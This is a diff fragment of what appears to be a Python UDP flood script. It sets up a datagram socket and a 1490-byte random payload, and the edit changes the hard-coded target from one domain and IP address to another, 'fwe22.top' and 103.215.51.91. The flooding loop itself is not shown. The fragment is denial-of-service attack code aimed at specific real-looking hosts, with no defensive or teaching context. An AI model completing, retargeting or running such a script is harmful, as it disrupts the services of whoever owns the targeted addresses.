@@ -14,9 +14,9 @@ sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 # Get ip.
-url = "liwuhe51.top"
+url = "fwe22.top"
 #ip = socket.gethostbyname(url)
-ip = "43.251.101.121"
+ip = "103.215.51.91"
 
 # Value.
 sent = 1
